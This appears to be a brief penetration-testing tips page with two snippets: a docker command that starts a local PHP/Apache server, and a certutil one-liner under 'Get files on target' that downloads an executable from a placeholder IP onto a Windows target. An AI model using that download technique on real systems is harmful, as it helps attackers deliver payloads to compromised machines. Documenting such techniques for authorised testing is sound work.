---
title: "Tips and Tricks"
date: 2021-02-17T17:22:05+01:00
categories: []
tags: []
---
### Pop up a quick PHP server
```text
docker run -p 8080:80 -v $(pwd):/var/www/html php:apache
```

### Get files on target
`certutil -urlcache -f http://IP/file.exe C:\Path\to\file.exe`